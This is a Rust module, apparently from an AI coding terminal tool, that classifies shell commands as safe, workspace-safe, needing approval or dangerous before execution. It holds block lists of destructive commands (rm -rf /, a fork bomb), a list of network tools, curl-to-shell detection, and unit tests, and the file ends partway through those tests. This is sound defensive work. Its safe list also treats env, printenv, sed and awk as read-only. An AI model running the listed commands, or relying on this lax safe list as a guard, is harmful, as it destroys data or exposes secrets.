#![allow(dead_code)]

//! Command safety analysis for shell execution
//!
//! This module provides pre-execution analysis of shell commands to detect
//! potentially dangerous patterns and prevent accidental damage.
//!
//! ## Command prefix classification
//!
//! [`classify_command`] maps a token slice to its canonical command prefix.
//! The prefix is the portion of the command that identifies *what action* is
//! being taken, stripped of flags and extra positional arguments.
//!
//! The arity dictionary [`COMMAND_ARITY`] encodes, for each known prefix, how
//! many *positional* (non-flag) words after the base command word form the
//! prefix.  Flags (tokens that start with `-`) never count toward arity.
//!
//! ### Examples
//!
//! | Input tokens                          | Arity | Canonical prefix  |
//! |---------------------------------------|-------|-------------------|
//! | `["git", "status", "-s"]`             | 1     | `"git status"`    |
//! | `["git", "checkout", "main"]`         | 2     | `"git checkout"`  |
//! | `["npm", "run", "dev"]`               | 2     | `"npm run"`       |
//! | `["docker", "compose", "up"]`         | 2     | `"docker compose"`|
//! | `["cargo", "check", "--workspace"]`   | 1     | `"cargo check"`   |
//!
//! Ported from opencode `packages/opencode/src/permission/arity.ts`.

// ── Arity dictionary ──────────────────────────────────────────────────────────

/// Arity dictionary: maps a command prefix (space-separated, lowercase) to the
/// number of positional (non-flag) words, *including the base command word*,
/// that form the canonical prefix.
///
/// Flags (tokens starting with `-`) are **never** counted toward arity — that
/// is the central invariant: `auto_allow = ["git status"]` must match
/// `git status -s`, `git status --porcelain`, etc., but not `git push`.
///
/// Ported from opencode `packages/opencode/src/permission/arity.ts` (163 LOC).
pub static COMMAND_ARITY: &[(&str, u8)] = &[
    // ── git ──────────────────────────────────────────────────────────────────
    ("git add", 2),
    ("git am", 2),
    ("git apply", 2),
    ("git bisect", 2),
    ("git blame", 2),
    ("git branch", 2),
    ("git cat-file", 2),
    ("git checkout", 2),
    ("git cherry-pick", 2),
    ("git clean", 2),
    ("git clone", 2),
    ("git commit", 2),
    ("git config", 2),
    ("git describe", 2),
    ("git diff", 2),
    ("git fetch", 2),
    ("git format-patch", 2),
    ("git grep", 2),
    ("git init", 2),
    ("git log", 2),
    ("git ls-files", 2),
    ("git merge", 2),
    ("git mv", 2),
    ("git notes", 2),
    ("git pull", 2),
    ("git push", 2),
    ("git rebase", 2),
    ("git reflog", 2),
    ("git remote", 2),
    ("git reset", 2),
    ("git restore", 2),
    ("git revert", 2),
    ("git rm", 2),
    ("git show", 2),
    ("git stash", 2),
    ("git status", 2),
    ("git submodule", 2),
    ("git switch", 2),
    ("git tag", 2),
    ("git worktree", 2),
    // ── npm ──────────────────────────────────────────────────────────────────
    ("npm audit", 2),
    ("npm build", 2),
    ("npm cache", 2),
    ("npm ci", 2),
    ("npm dedupe", 2),
    ("npm fund", 2),
    ("npm help", 2),
    ("npm info", 2),
    ("npm init", 2),
    ("npm install", 2),
    ("npm link", 2),
    ("npm list", 2),
    ("npm ls", 2),
    ("npm outdated", 2),
    ("npm pack", 2),
    ("npm prune", 2),
    ("npm publish", 2),
    ("npm rebuild", 2),
    ("npm run", 3),
    ("npm start", 2),
    ("npm stop", 2),
    ("npm test", 2),
    ("npm uninstall", 2),
    ("npm update", 2),
    ("npm version", 2),
    ("npm view", 2),
    // ── yarn ─────────────────────────────────────────────────────────────────
    ("yarn add", 2),
    ("yarn audit", 2),
    ("yarn build", 2),
    ("yarn install", 2),
    ("yarn run", 3),
    ("yarn start", 2),
    ("yarn test", 2),
    ("yarn upgrade", 2),
    ("yarn workspace", 3),
    // ── pnpm ─────────────────────────────────────────────────────────────────
    ("pnpm add", 2),
    ("pnpm build", 2),
    ("pnpm install", 2),
    ("pnpm run", 3),
    ("pnpm start", 2),
    ("pnpm test", 2),
    ("pnpm update", 2),
    // ── cargo ────────────────────────────────────────────────────────────────
    ("cargo add", 2),
    ("cargo bench", 2),
    ("cargo build", 2),
    ("cargo check", 2),
    ("cargo clean", 2),
    ("cargo clippy", 2),
    ("cargo doc", 2),
    ("cargo fix", 2),
    ("cargo fmt", 2),
    ("cargo generate", 2),
    ("cargo install", 2),
    ("cargo metadata", 2),
    ("cargo package", 2),
    ("cargo publish", 2),
    ("cargo remove", 2),
    ("cargo run", 2),
    ("cargo search", 2),
    ("cargo test", 2),
    ("cargo tree", 2),
    ("cargo uninstall", 2),
    ("cargo update", 2),
    ("cargo yank", 2),
    // ── docker ───────────────────────────────────────────────────────────────
    ("docker build", 2),
    ("docker compose", 3),
    ("docker container", 3),
    ("docker cp", 2),
    ("docker exec", 2),
    ("docker image", 3),
    ("docker images", 2),
    ("docker inspect", 2),
    ("docker kill", 2),
    ("docker logs", 2),
    ("docker network", 3),
    ("docker ps", 2),
    ("docker pull", 2),
    ("docker push", 2),
    ("docker rm", 2),
    ("docker rmi", 2),
    ("docker run", 2),
    ("docker start", 2),
    ("docker stop", 2),
    ("docker system", 3),
    ("docker tag", 2),
    ("docker volume", 3),
    // ── kubectl ──────────────────────────────────────────────────────────────
    ("kubectl apply", 2),
    ("kubectl create", 3),
    ("kubectl delete", 3),
    ("kubectl describe", 3),
    ("kubectl exec", 2),
    ("kubectl explain", 2),
    ("kubectl get", 3),
    ("kubectl label", 2),
    ("kubectl logs", 2),
    ("kubectl patch", 2),
    ("kubectl port-forward", 2),
    ("kubectl rollout", 3),
    ("kubectl scale", 2),
    ("kubectl set", 2),
    ("kubectl top", 3),
    // ── go ───────────────────────────────────────────────────────────────────
    ("go build", 2),
    ("go clean", 2),
    ("go env", 2),
    ("go fmt", 2),
    ("go generate", 2),
    ("go get", 2),
    ("go install", 2),
    ("go list", 2),
    ("go mod", 3),
    ("go run", 2),
    ("go test", 2),
    ("go vet", 2),
    ("go work", 3),
    // ── python / pip ─────────────────────────────────────────────────────────
    ("pip install", 2),
    ("pip uninstall", 2),
    ("pip list", 2),
    ("pip show", 2),
    ("pip freeze", 2),
    ("pip3 install", 2),
    ("pip3 uninstall", 2),
    ("pip3 list", 2),
    ("pip3 show", 2),
    ("python -m", 3),
    ("python3 -m", 3),
    // ── make / cmake ─────────────────────────────────────────────────────────
    ("make", 1),
    // ── gh (GitHub CLI) ──────────────────────────────────────────────────────
    ("gh pr", 3),
    ("gh issue", 3),
    ("gh repo", 3),
    ("gh release", 3),
    ("gh workflow", 3),
    ("gh run", 3),
    ("gh secret", 3),
    // ── rustup ───────────────────────────────────────────────────────────────
    ("rustup default", 2),
    ("rustup install", 2),
    ("rustup show", 2),
    ("rustup target", 3),
    ("rustup toolchain", 3),
    ("rustup update", 2),
    // ── deno / bun / node ────────────────────────────────────────────────────
    ("deno run", 2),
    ("deno test", 2),
    ("deno fmt", 2),
    ("deno lint", 2),
    ("bun add", 2),
    ("bun build", 2),
    ("bun install", 2),
    ("bun run", 3),
    ("bun test", 2),
    ("npx", 2),
];

/// Return the canonical command prefix for a slice of command tokens.
///
/// The prefix is determined by the [`COMMAND_ARITY`] dictionary:
///
/// 1. Tokens that start with `-` are treated as flags and **skipped** — they
///    never contribute to arity.
/// 2. The arity value `n` means that `n` positional words (including the base
///    command name) form the canonical prefix.
/// 3. The longest matching dictionary entry wins (greedy).
/// 4. If no dictionary entry matches, the single base command word is returned
///    as the prefix.
///
/// # Examples
///
/// ```
/// # use deepseek_tui::command_safety::classify_command;
/// assert_eq!(classify_command(&["git", "status", "-s"]),            "git status");
/// assert_eq!(classify_command(&["git", "push", "origin"]),          "git push");
/// assert_eq!(classify_command(&["cargo", "check", "--workspace"]),  "cargo check");
/// assert_eq!(classify_command(&["npm", "run", "dev"]),              "npm run dev");
/// assert_eq!(classify_command(&["ls", "-la"]),                      "ls");
/// ```
pub fn classify_command(tokens: &[&str]) -> String {
    if tokens.is_empty() {
        return String::new();
    }

    // Collect only the positional (non-flag) tokens, lowercased.
    let positional: Vec<String> = tokens
        .iter()
        .filter(|t| !t.starts_with('-'))
        .map(|t| t.to_ascii_lowercase())
        .collect();

    if positional.is_empty() {
        return String::new();
    }

    // Try matching from the longest possible prefix down to 1 positional word.
    // Maximum lookup depth is 3 (covers all entries in the dictionary that use
    // arity ≤ 3; the arity-3 entries consume at most 3 positional tokens).
    let max_depth = positional.len().min(3);
    for depth in (1..=max_depth).rev() {
        let candidate = positional[..depth].join(" ");
        if let Some(&(_key, arity)) = COMMAND_ARITY.iter().find(|(key, _)| **key == candidate) {
            // Found a matching dictionary entry.  Return the positional tokens
            // up to min(arity, available_positional_count) joined by spaces.
            let take = (arity as usize).min(positional.len());
            return positional[..take].join(" ");
        }
    }

    // No dictionary match → single-word prefix (the base command name).
    positional[0].clone()
}

/// Return `true` when an allow-rule `pattern` (a command-prefix string such
/// as `"git status"`) matches the concrete `command` string using the
/// arity-aware prefix classification from [`classify_command`].
///
/// This is the canonical entry point for config `allow` / `auto_allow` rule
/// evaluation.  It correctly handles:
///
/// * `"git status"` → matches `git status -s`, `git status --porcelain`;
///   does **not** match `git push origin main`.
/// * `"npm run dev"` → matches only `npm run dev`, not `npm run build`.
/// * `"cargo check"` → matches `cargo check --workspace`.
/// * `"make"` → matches `make all`, `make clean` (arity 1).
///
/// For allow rules that contain wildcards (`*`) or regex metacharacters, the
/// caller should additionally invoke the pattern-matching path from
/// `crate::execpolicy::matcher::pattern_matches`.
///
/// # Examples
///
/// ```
/// # use deepseek_tui::command_safety::prefix_allow_matches;
/// assert!( prefix_allow_matches("git status",    "git status --porcelain"));
/// assert!(!prefix_allow_matches("git status",    "git push origin main"));
/// assert!( prefix_allow_matches("cargo check",   "cargo check --workspace"));
/// assert!( prefix_allow_matches("npm run dev",   "npm run dev"));
/// assert!(!prefix_allow_matches("npm run dev",   "npm run build"));
/// ```
pub fn prefix_allow_matches(pattern: &str, command: &str) -> bool {
    // Normalise the pattern: trim + lowercase + collapse whitespace.
    let pattern_norm: String = pattern
        .trim()
        .to_ascii_lowercase()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ");

    let tokens: Vec<&str> = command.split_whitespace().collect();
    if tokens.is_empty() {
        return pattern_norm.is_empty();
    }

    // Primary path: arity-aware classification.
    let canonical = classify_command(&tokens);
    if canonical == pattern_norm {
        return true;
    }

    // Fallback: normalised exact match for patterns not in the arity table
    // (e.g. exact-match rules like `"ls -la"` that lack a dictionary entry).
    let command_norm: String = command
        .trim()
        .to_ascii_lowercase()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ");
    command_norm == pattern_norm || command_norm.starts_with(&format!("{pattern_norm} "))
}

/// Safety classification of a command
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SafetyLevel {
    /// Command is known to be safe (read-only operations)
    Safe,
    /// Command is safe within the workspace but may modify files
    WorkspaceSafe,
    /// Command may have system-wide effects and requires approval
    RequiresApproval,
    /// Command is potentially dangerous and should be blocked
    Dangerous,
}

/// Result of analyzing a command
#[derive(Debug, Clone)]
pub struct SafetyAnalysis {
    pub level: SafetyLevel,
    pub command: String,
    pub reasons: Vec<String>,
    pub suggestions: Vec<String>,
}

impl SafetyAnalysis {
    pub fn safe(command: &str) -> Self {
        Self {
            level: SafetyLevel::Safe,
            command: command.to_string(),
            reasons: vec!["Command is read-only".to_string()],
            suggestions: vec![],
        }
    }

    pub fn workspace_safe(command: &str, reason: &str) -> Self {
        Self {
            level: SafetyLevel::WorkspaceSafe,
            command: command.to_string(),
            reasons: vec![reason.to_string()],
            suggestions: vec![],
        }
    }

    pub fn requires_approval(command: &str, reasons: Vec<String>) -> Self {
        Self {
            level: SafetyLevel::RequiresApproval,
            command: command.to_string(),
            reasons,
            suggestions: vec![],
        }
    }

    pub fn dangerous(command: &str, reasons: Vec<String>, suggestions: Vec<String>) -> Self {
        Self {
            level: SafetyLevel::Dangerous,
            command: command.to_string(),
            reasons,
            suggestions,
        }
    }
}

/// Known safe commands that only read data
const SAFE_COMMANDS: &[&str] = &[
    "ls",
    "dir",
    "pwd",
    "cd",
    "cat",
    "head",
    "tail",
    "less",
    "more",
    "grep",
    "rg",
    "ag",
    "find",
    "fd",
    "which",
    "whereis",
    "type",
    "echo",
    "printf",
    "date",
    "cal",
    "uptime",
    "whoami",
    "id",
    "hostname",
    "uname",
    "env",
    "printenv",
    "set",
    "ps",
    "top",
    "htop",
    "df",
    "du",
    "free",
    "vmstat",
    "wc",
    "sort",
    "uniq",
    "cut",
    "tr",
    "awk",
    "sed",
    "diff",
    "file",
    "stat",
    "md5",
    "sha1sum",
    "sha256sum",
    "git status",
    "git log",
    "git diff",
    "git show",
    "git branch",
    "git remote",
    "git tag",
    "git stash list",
    "npm list",
    "npm ls",
    "npm outdated",
    "npm view",
    "cargo check",
    "cargo test",
    "cargo build",
    "cargo doc",
    "python --version",
    "node --version",
    "rustc --version",
    "man",
    "help",
    "info",
];

/// Commands that are safe within workspace but modify files
const WORKSPACE_SAFE_COMMANDS: &[&str] = &[
    "mkdir",
    "touch",
    "cp",
    "mv",
    "git add",
    "git commit",
    "git checkout",
    "git switch",
    "git restore",
    "git merge",
    "git rebase",
    "git cherry-pick",
    "git reset --soft",
    "npm install",
    "npm ci",
    "npm update",
    "cargo build",
    "cargo run",
    "cargo test",
    "cargo fmt",
    "pip install",
    "pip uninstall",
    "make",
    "cmake",
    "ninja",
];

/// Dangerous command patterns that should be blocked or warned.
///
/// Codex flags only explicit `rm -f*` / `rm -rf` patterns. We match
/// that restraint — aggressive patterns for shutdown, reboot, killall,
/// docker rm, chown, etc. have been removed because they generate
/// unnecessary approval prompts for routine operations the user can
/// still veto via the approval dialog.
const DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    ("rm -rf /", "Attempts to recursively delete root filesystem"),
    (
        "rm -rf /*",
        "Attempts to recursively delete all root directories",
    ),
    ("rm -rf ~", "Attempts to recursively delete home directory"),
    (
        "rm -rf $HOME",
        "Attempts to recursively delete home directory",
    ),
    (":(){ :|:& };:", "Fork bomb — will crash the system"),
];

/// Commands that require elevated privileges
const PRIVILEGED_PATTERNS: &[&str] = &["sudo", "su ", "doas", "pkexec", "gksudo", "kdesudo"];

/// Network-related commands
const NETWORK_COMMANDS: &[&str] = &[
    "curl",
    "wget",
    "fetch",
    "nc",
    "netcat",
    "ncat",
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "ftp",
    "ping",
    "traceroute",
    "nslookup",
    "dig",
    "host",
    "nmap",
    "masscan",
    "tcpdump",
    "wireshark",
];

/// Analyze a shell command for safety
pub fn analyze_command(command: &str) -> SafetyAnalysis {
    let command_lower = command.to_lowercase();
    let command_trimmed = command.trim();

    if command.contains('\n') || command.contains('\r') {
        return SafetyAnalysis::dangerous(
            command,
            vec!["Command contains multiple lines".to_string()],
            vec!["Run one command at a time".to_string()],
        );
    }

    if command.contains('\0') {
        return SafetyAnalysis::dangerous(
            command,
            vec!["Command contains a null byte".to_string()],
            vec!["Strip embedded null bytes before retrying".to_string()],
        );
    }

    if let Some(analysis) = analyze_destructive_patterns(command) {
        return analysis;
    }

    if command.contains("&&") || command.contains("||") || command.contains(';') {
        // Chains of known-safe commands (cargo/git/zig/npm/etc.) are
        // routine for build+test workflows. Instead of hard-blocking,
        // escalate to RequiresApproval so the user can still deny in
        // non-trusted modes. YOLO/auto-approve flows pass through.
        if all_segments_known_safe(command) {
            return SafetyAnalysis::requires_approval(
                command,
                vec!["Command chains known-safe segments (cargo/git/etc.)".to_string()],
            );
        }
        // Unknown chains escalate to RequiresApproval instead of
        // Dangerous — the user can still deny them. Codex only blocks
        // explicit `rm -rf` patterns (above) and lets the user decide
        // on everything else.
        return SafetyAnalysis::requires_approval(
            command,
            vec!["Command chaining detected".to_string()],
        );
    }

    if command.contains("`") || command.contains("$(") {
        // Substitution is a common shell pattern (e.g., `cargo test
        // $(cargo test --list | head -1)` or `echo $(date)`). Codex
        // doesn't block it; escalate to approval so the user can
        // inspect, but don't hard-block.
        return SafetyAnalysis::requires_approval(
            command,
            vec!["Command substitution detected".to_string()],
        );
    }

    // Check for dangerous patterns first. The token-aware pass above handles
    // spacing and quoting variants; these literal patterns remain as a compact
    // fallback for legacy shapes.
    for (pattern, reason) in DANGEROUS_PATTERNS {
        if command_lower.contains(&pattern.to_lowercase()) {
            return SafetyAnalysis::dangerous(
                command,
                vec![(*reason).to_string()],
                vec!["Review the command carefully before execution".to_string()],
            );
        }
    }

    // Check for privileged commands
    for pattern in PRIVILEGED_PATTERNS {
        if command_trimmed.starts_with(pattern) || command_lower.contains(&format!(" {pattern} ")) {
            return SafetyAnalysis::requires_approval(
                command,
                vec![format!(
                    "Command uses privileged execution ({})",
                    pattern.trim()
                )],
            );
        }
    }

    // Check for pipe to shell (remote code execution risk)
    if (command_lower.contains("curl") || command_lower.contains("wget"))
        && (command_lower.contains("| sh")
            || command_lower.contains("| bash")
            || command_lower.contains("| zsh"))
    {
        return SafetyAnalysis::dangerous(
            command,
            vec!["Piping remote content directly to shell is dangerous".to_string()],
            vec!["Download the script first and review it before execution".to_string()],
        );
    }

    // Check if it's a known safe command
    let first_word = command_trimmed.split_whitespace().next().unwrap_or("");
    if is_safe_command(command_trimmed) {
        return SafetyAnalysis::safe(command);
    }

    // Check for workspace-safe commands
    if is_workspace_safe_command(command_trimmed) {
        return SafetyAnalysis::workspace_safe(command, "Command modifies files within workspace");
    }

    // Check for network commands
    if NETWORK_COMMANDS.contains(&first_word) {
        return SafetyAnalysis::requires_approval(
            command,
            vec!["Command may make network requests".to_string()],
        );
    }

    // Check for rm with -r or -f flags
    if first_word == "rm" && (command_lower.contains("-r") || command_lower.contains("-f")) {
        let mut reasons = vec!["Recursive or forced deletion".to_string()];
        let mut suggestions = vec![];

        // Check if it's deleting outside workspace markers
        if command_lower.contains("..")
            || command_lower.contains("~/")
            || command_lower.contains("$HOME")
        {
            reasons.push("May delete files outside workspace".to_string());
            suggestions.push("Use relative paths within the workspace".to_string());
            return SafetyAnalysis::dangerous(command, reasons, suggestions);
        }

        return SafetyAnalysis::requires_approval(command, reasons);
    }

    // Check for git push/force operations
    if command_lower.contains("git push") {
        if command_lower.contains("--force") || command_lower.contains("-f") {
            return SafetyAnalysis::requires_approval(
                command,
                vec!["Force push can overwrite remote history".to_string()],
            );
        }
        return SafetyAnalysis::requires_approval(
            command,
            vec!["Push will modify remote repository".to_string()],
        );
    }

    // Default: requires approval for unknown commands
    SafetyAnalysis::requires_approval(
        command,
        vec!["Unknown command - review before execution".to_string()],
    )
}

fn analyze_destructive_patterns(command: &str) -> Option<SafetyAnalysis> {
    if primary_shell_command_is(command, "eval") {
        return Some(SafetyAnalysis::dangerous(
            command,
            vec!["Command invokes shell eval".to_string()],
            vec!["Avoid evaluating dynamically generated shell input".to_string()],
        ));
    }

    if pipes_remote_content_to_shell(command) {
        return Some(SafetyAnalysis::dangerous(
            command,
            vec!["Piping remote content directly to shell is dangerous".to_string()],
            vec!["Download the script first and review it before execution".to_string()],
        ));
    }

    for segment in split_command_segments(command) {
        let tokens = shell_words(&segment);
        let Some(start) = primary_token_index(&tokens) else {
            continue;
        };
        match tokens[start].as_str() {
            "rm" => {
                if let Some(reason) = dangerous_rm_reason(&tokens[start + 1..]) {
                    return Some(SafetyAnalysis::dangerous(
                        command,
                        vec![reason],
                        vec!["Review the deletion target before retrying".to_string()],
                    ));
                }
            }
            "find" => {
                if let Some(analysis) = analyze_find_mutation(command, &tokens[start + 1..]) {
                    return Some(analysis);
                }
            }
            _ => {}
        }
    }

    None
}

fn split_command_segments(command: &str) -> Vec<String> {
    command
        .replace("&&", "\n")
        .replace("||", "\n")
        .replace(';', "\n")
        .split('\n')
        .map(str::trim)
        .filter(|segment| !segment.is_empty())
        .map(ToOwned::to_owned)
        .collect()
}

fn shell_words(segment: &str) -> Vec<String> {
    shlex::split(segment).unwrap_or_else(|| {
        segment
            .split_whitespace()
            .map(|token| token.trim_matches(['"', '\'']).to_string())
            .collect()
    })
}

fn primary_token_index(tokens: &[String]) -> Option<usize> {
    let mut idx = 0;
    while idx < tokens.len() {
        let token = tokens[idx].as_str();
        if token == "env" {
            idx += 1;
            while idx < tokens.len()
                && (tokens[idx].starts_with('-') || is_env_assignment(&tokens[idx]))
            {
                idx += 1;
            }
            continue;
        }
        if is_env_assignment(token) {
            idx += 1;
            continue;
        }
        return Some(idx);
    }
    None
}

fn is_env_assignment(token: &str) -> bool {
    let Some((name, _value)) = token.split_once('=') else {
        return false;
    };
    !name.is_empty()
        && name
            .chars()
            .all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
        && name
            .chars()
            .next()
            .is_some_and(|ch| ch == '_' || ch.is_ascii_alphabetic())
}

fn primary_shell_command_is(command: &str, expected: &str) -> bool {
    split_command_segments(command).into_iter().any(|segment| {
        let tokens = shell_words(&segment);
        primary_token_index(&tokens)
            .and_then(|idx| tokens.get(idx))
            .is_some_and(|token| token == expected)
    })
}

fn pipes_remote_content_to_shell(command: &str) -> bool {
    split_command_segments(command).into_iter().any(|segment| {
        let parts: Vec<&str> = segment.split('|').collect();
        if parts.len() < 2 {
            return false;
        }
        parts.windows(2).any(|window| {
            let left = window[0].to_ascii_lowercase();
            if !(left.contains("curl") || left.contains("wget")) {
                return false;
            }
            let right_tokens = shell_words(window[1]);
            primary_token_index(&right_tokens)
                .and_then(|idx| right_tokens.get(idx))
                .is_some_and(|token| matches!(token.as_str(), "sh" | "bash" | "zsh"))
        })
    })
}

fn dangerous_rm_reason(args: &[String]) -> Option<String> {
    let mut recursive = false;
    let mut force = false;
    let mut targets = Vec::new();

    for arg in args {
        match arg.as_str() {
            "--" => continue,
            "--recursive" | "--dir" => recursive = true,
            "--force" => force = true,
            flag if flag.starts_with('-') && !flag.starts_with("--") => {
                recursive |= flag.chars().any(|ch| matches!(ch, 'r' | 'R'));
                force |= flag.chars().any(|ch| ch == 'f');
            }
            target => targets.push(target),
        }
    }

    if !(recursive || force) {
        return None;
    }

    for target in targets {
        if is_root_delete_target(target) {
            return Some("Recursive or forced deletion targets the root filesystem".to_string());
        }
        if is_home_delete_target(target) {
            return Some("Recursive or forced deletion targets the home directory".to_string());
        }
        if target_contains_parent_escape(target) {
            return Some("Recursive or forced deletion may escape the workspace".to_string());
        }
    }

    None
}

fn analyze_find_mutation(command: &str, args: &[String]) -> Option<SafetyAnalysis> {
    let has_delete = args.iter().any(|arg| arg == "-delete");
    let execs_rm = args
        .windows(2)
        .any(|pair| pair[0] == "-exec" && pair[1] == "rm");
    if !(has_delete || execs_rm) {
        return None;
    }

    let targets: Vec<&str> = args
        .iter()
        .take_while(|arg| !arg.starts_with('-'))
        .map(String::as_str)
        .collect();
    if targets.iter().any(|target| {
        is_root_delete_target(target)
            || is_home_delete_target(target)
            || target_contains_parent_escape(target)
    }) {
        return Some(SafetyAnalysis::dangerous(
            command,
            vec!["find mutation targets a broad or external path".to_string()],
            vec!["Restrict the find root to a workspace-relative path".to_string()],
        ));
    }

    Some(SafetyAnalysis::requires_approval(
        command,
        vec!["find command may delete files".to_string()],
    ))
}

fn is_root_delete_target(target: &str) -> bool {
    let normalized = target.trim_matches(['"', '\'']).replace('\\', "/");
    normalized == "/"
        || normalized == "/*"
        || normalized == "//"
        || normalized.starts_with("/*/")
        || normalized.starts_with("/.")
}

fn is_home_delete_target(target: &str) -> bool {
    let normalized = target.trim_matches(['"', '\'']).replace('\\', "/");
    let lower = normalized.to_ascii_lowercase();
    lower == "~"
        || lower.starts_with("~/")
        || lower == "$home"
        || lower.starts_with("$home/")
        || lower == "${home}"
        || lower.starts_with("${home}/")
}

fn target_contains_parent_escape(target: &str) -> bool {
    target
        .replace('\\', "/")
        .split('/')
        .any(|component| component == "..")
}

/// Check if a command is known to be safe
fn is_safe_command(command: &str) -> bool {
    let command_lower = command.to_lowercase();

    for safe_cmd in SAFE_COMMANDS {
        if command_lower.starts_with(safe_cmd) {
            return true;
        }
    }

    false
}

/// Build/test/source-control commands that are reasonable to chain in a
/// trusted workspace (`cd /tmp/foo && cargo build`, `cargo test --workspace
/// && cargo clippy`, etc.). The match is by leading token, not full string,
/// so flags don't trip the check.
const KNOWN_SAFE_CHAIN_PREFIXES: &[&str] = &[
    "cargo", "rustc", "rustup", "git", "gh", "hub", "npm", "yarn", "pnpm", "node", "npx", "zig",
    "go", "deno", "bun", "make", "cmake", "ninja", "meson", "python", "python3", "pip", "pip3",
    "uv", "poetry", "ls", "pwd", "cd", "echo", "cat", "head", "tail", "grep", "rg", "find", "fd",
    "wc", "sort", "uniq", "which", "env", "true", "false",
];

/// Return true when every segment of a chained command (`a && b ; c || d`)
/// has a leading token in `KNOWN_SAFE_CHAIN_PREFIXES`. Used to permit routine
/// build+test chains without escalating to Dangerous.
fn all_segments_known_safe(command: &str) -> bool {
    let normalized = command
        .replace("&&", "\n")
        .replace("||", "\n")
        .replace(';', "\n");
    let segments: Vec<&str> = normalized
        .split('\n')
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .collect();
    if segments.is_empty() {
        return false;
    }
    segments.iter().all(|seg| {
        let head = seg
            .split_whitespace()
            .find(|tok| !tok.contains('=') && *tok != "env")
            .unwrap_or("");
        KNOWN_SAFE_CHAIN_PREFIXES
            .iter()
            .any(|prefix| head.eq_ignore_ascii_case(prefix))
    })
}

/// Check if a command is safe within the workspace
fn is_workspace_safe_command(command: &str) -> bool {
    let command_lower = command.to_lowercase();

    for ws_cmd in WORKSPACE_SAFE_COMMANDS {
        if command_lower.starts_with(ws_cmd) {
            return true;
        }
    }

    false
}

/// Check if a path escapes the workspace
pub fn path_escapes_workspace(path: &str, workspace: &str) -> bool {
    let path_lower = normalize_safety_path(path);
    let workspace_lower = normalize_safety_path(workspace);

    // Check for obvious escape patterns
    if path_lower.starts_with("~/") || path_lower.starts_with("$home") {
        return true;
    }

    if is_absolute_safety_path(&path_lower) {
        let path_components = lexical_components(&path_lower);
        let workspace_components = lexical_components(&workspace_lower);
        return !components_start_with(&path_components, &workspace_components);
    }

    // Walk the path components. Track depth relative to the workspace root:
    // non-`..` components increment depth, `..` components decrement it.
    // If depth ever goes negative, the path escapes the workspace boundary.
    // This correctly distinguishes genuine traversal like `../outside` from
    // names that happen to contain consecutive dots like `foo..bar`.
    let mut depth: i32 = 0;
    for component in path_lower.split('/') {
        match component {
            "" | "." => {}
            ".." => depth -= 1,
            _ => depth += 1,
        }
        if depth < 0 {
            return true;
        }
    }

    false
}

fn normalize_safety_path(path: &str) -> String {
    path.trim().replace('\\', "/").to_lowercase()
}

fn is_absolute_safety_path(path: &str) -> bool {
    path.starts_with('/')
        || path
            .as_bytes()
            .get(1..3)
            .is_some_and(|bytes| bytes[0] == b':' && bytes[1] == b'/')
}

fn lexical_components(path: &str) -> Vec<&str> {
    let mut components = Vec::new();
    for component in path.split('/') {
        match component {
            "" | "." => {}
            ".." => {
                components.pop();
            }
            _ => components.push(component),
        }
    }
    components
}

fn components_start_with(path: &[&str], prefix: &[&str]) -> bool {
    path.len() >= prefix.len() && path.iter().zip(prefix.iter()).all(|(a, b)| a == b)
}

/// Parse a command and extract the primary command name
pub fn extract_primary_command(command: &str) -> Option<&str> {
    let trimmed = command.trim();

    // Handle env vars at start
    if trimmed.starts_with("env ") || trimmed.starts_with("ENV=") {
        // Skip env setup - find first token that's not an env var
        trimmed
            .split_whitespace()
            .find(|s| !s.contains('=') && *s != "env")
    } else {
        trimmed.split_whitespace().next()
    }
}

/// Categorize commands into groups
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommandCategory {
    FileSystem,
    Network,
    Process,
    Package,
    Git,
    Build,
    System,
    Shell,
    Other,
}

/// Get the category of a command
pub fn categorize_command(command: &str) -> CommandCategory {
    let primary = match extract_primary_command(command) {
        Some(cmd) => cmd.to_lowercase(),
        None => return CommandCategory::Other,
    };

    match primary.as_str() {
        "ls" | "dir" | "cat" | "head" | "tail" | "less" | "more" | "cp" | "mv" | "rm" | "mkdir"
        | "rmdir" | "touch" | "chmod" | "chown" | "ln" | "find" | "fd" | "locate" | "stat"
        | "file" => CommandCategory::FileSystem,

        "curl" | "wget" | "fetch" | "nc" | "netcat" | "ssh" | "scp" | "sftp" | "rsync" | "ftp"
        | "ping" | "traceroute" | "nslookup" | "dig" | "host" | "nmap" => CommandCategory::Network,

        "ps" | "top" | "htop" | "kill" | "killall" | "pkill" | "pgrep" | "nice" | "renice"
        | "nohup" | "timeout" => CommandCategory::Process,

        "npm" | "yarn" | "pnpm" | "pip" | "pip3" | "brew" | "apt" | "apt-get" | "yum" | "dnf"
        | "pacman" => CommandCategory::Package,

        "git" | "gh" | "hub" => CommandCategory::Git,

        "make" | "cmake" | "ninja" | "meson" | "cargo" | "go" | "gcc" | "g++" | "clang"
        | "rustc" | "javac" | "tsc" => CommandCategory::Build,

        "sudo" | "su" | "systemctl" | "service" | "shutdown" | "reboot" | "mount" | "umount"
        | "fdisk" | "parted" => CommandCategory::System,

        "bash" | "sh" | "zsh" | "fish" | "csh" | "tcsh" | "dash" | "source" | "." | "exec"
        | "eval" => CommandCategory::Shell,

        _ => CommandCategory::Other,
    }
}

// === Unit Tests ===

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_commands() {
        assert_eq!(analyze_command("ls -la").level, SafetyLevel::Safe);
        assert_eq!(analyze_command("cat file.txt").level, SafetyLevel::Safe);
        assert_eq!(analyze_command("git status").level, SafetyLevel::Safe);
        assert_eq!(
            analyze_command("grep pattern file").level,
            SafetyLevel::Safe
        );
    }

    #[test]
    fn test_workspace_safe_commands() {
        assert_eq!(
            analyze_command("mkdir test").level,
            SafetyLevel::WorkspaceSafe
        );
        assert_eq!(
            analyze_command("touch file.txt").level,
            SafetyLevel::WorkspaceSafe
        );
        assert_eq!(
            analyze_command("npm install").level,
            SafetyLevel::WorkspaceSafe
        );
    }

    #[test]
    fn test_dangerous_commands() {
        assert_eq!(analyze_command("rm -rf /").level, SafetyLevel::Dangerous);
        assert_eq!(analyze_command("rm -rf ~").level, SafetyLevel::Dangerous);
        assert_eq!(
